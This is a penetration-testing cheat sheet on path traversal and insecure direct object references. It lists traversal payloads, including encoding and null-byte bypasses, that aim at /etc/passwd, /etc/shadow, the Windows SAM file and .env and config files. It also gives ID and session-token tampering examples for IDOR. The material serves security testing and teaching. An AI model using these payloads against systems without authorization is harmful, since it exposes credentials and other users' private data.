# Path Traversal Attacks
Look for these indicators in applications:

- **File parameter patterns:** URLs containing file, filename, document, or path parameters
- **Direct file references:** Parameters that appear to reference specific files
- **File extension handling:** Applications that process different file types
- **Download functionality:** Features that retrieve and serve files to users
- **Error messages:** File system errors that reveal directory structure

**Simple Directory Traversal:**

```
../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts
```

**URL Encoded Traversal:**

```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e\%2e%2e\%2e%2e\windows\system32\drivers\etc\hosts
```

**Double URL Encoding:**

```
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

**Absolute Path Attempts:**

```
/etc/passwd
/var/log/apache2/access.log
C:\windows\system32\drivers\etc\hosts
```

Advanced Path Traversal Bypass

**Null Byte Injection:**

```
../../../etc/passwd%00.png
../../../../etc/passwd%00.jpg
```

Using %00 to terminate strings (older systems)

**Unicode Alternatives:**

```
\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd
```

Alternative character representations

**Case Variations:**

```
..\..\..\WINDOWS\system32\drivers\etc\hosts
..\..\..\Windows\System32\Drivers\Etc\Hosts
```

Mixed case paths on case-insensitive systems

**Redundant Separators:**

```
..//..//..//etc/passwd
..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
```

Multiple slashes or backslashes

**Mixed Separators:**

```
..//..\\/..//etc/passwd
```

## Common Target Files

High-value files on Linux systems:

- /etc/passwd - User account information
- /etc/shadow - Password hashes (if accessible)
- /etc/hosts - Host name mappings
- /etc/ssh/ssh_config - SSH configuration
- /var/log/apache2/access.log - Web server logs
- /proc/version - System version information
- /home/user/.bash_history - Command history

High-value files on Windows systems:

- C:\windows\system32\drivers\etc\hosts
- C:\windows\win.ini - Windows configuration
- C:\windows\system.ini - System configuration
- C:\windows\system32\config\SAM - Security accounts
- C:\inetpub\logs\LogFiles\W3SVC1\ - IIS logs
- C:\windows\debug\NetSetup.log - Network setup

Target files specific to different platforms:

- **PHP Applications:** config.php, wp-config.php, .env files
- **Java Applications:** web.xml, application.properties, context.xml
- **Node.js Applications:** package.json, .env, config files
- **Python Applications:** settings.py, config.py, requirements.txt
- **ASP.NET Applications:** web.config, appsettings.json

# Insecure Direct Object References(IDOR)
 vulnerabilities commonly appear in:

- **URL parameters:** Direct object IDs in GET requests
- **Form fields:** Hidden or visible form inputs containing object references
- **API endpoints:** REST API calls with resource identifiers
- **File download systems:** Document or file IDs for retrieval
- **User profile systems:** User ID parameters for profile viewing
- **Database record access:** Direct database primary key exposure
- **Session management:** Session tokens or user identifiers
- **Administrative interfaces:** Management systems with object references

Basic IDOR Testing

**URL Parameter Testing:**

```
Original: https://app.com/profile?user_id=123
Test: https://app.com/profile?user_id=124
Test: https://app.com/profile?user_id=122
Test: https://app.com/profile?user_id=1
```

**API Endpoint Testing:**

```
Original: GET /api/orders/123
Test: GET /api/orders/124
Test: GET /api/orders/1
Test: GET /api/orders/999
```

These tests systematically modify object identifiers to check for unauthorized access.

**Form Field Testing:**

```
input type="hidden" name="account_id" value="123"
Change to: value="124", value="1", etc. -->
```

**Document Access Testing:**

```
Original: https://app.com/download?doc=user123_file.pdf
Test: https://app.com/download?doc=user124_file.pdf
```

Advanced techniques for finding IDOR vulnerabilities:

**Multi-User Testing Scenario:**

```
User A (ID: 123) creates resource (Resource ID: 456)
User B (ID: 789) attempts to access Resource ID: 456
Expected: Access denied
Vulnerability: Access granted
```

Multi-user testing verifies that access controls properly isolate user resources.

**HTTP Method Testing:**

```
GET /api/users/123     # view profile
POST /api/users/123    # modify profile  
PUT /api/users/123     # update profile
DELETE /api/users/123  # delete profile
```

Testing different HTTP methods can reveal inconsistent access control enforcement.

**Encoded ID Testing:**

```
Original: user_id=123
Base64: user_id=MTIz
Hex: user_id=7b
MD5: user_id=202cb962ac59075b964b07152d234b70
```

Encoded identifiers may bypass simple access control checks.

**Session Token Manipulation:**

```
Original: session=abc123user456
Modified: session=abc123user457
Original: auth_token=eyJ1c2VyIjoxMjN9
Modified: auth_token=eyJ1c2VyIjoxMjR9
```

### Manual Testing Strategies
Systematic parameter identification:

- Map all parameters in URLs, forms, and APIs
- Identify numeric IDs, GUIDs, or encoded identifiers
- Document parameter patterns and naming conventions
- Note sequential vs. random ID patterns
- Test with multiple user accounts

Verify proper access controls:

- Test access with different user privilege levels
- Attempt cross-user resource access
- Try accessing admin-only resources
- Test unauthenticated access to protected resources
- Verify error messages don't leak information

### Automated IDOR Testing

- **Burp Suite Intruder:** Automated parameter manipulation
- **OWASP ZAP:** Automated security scanning with IDOR detection
- **Autorize (Burp Extension):** Automated authorization testing
- **AuthMatrix (Burp Extension):** Multi-user authorization testing
- **Custom scripts:** Python scripts for systematic ID enumeration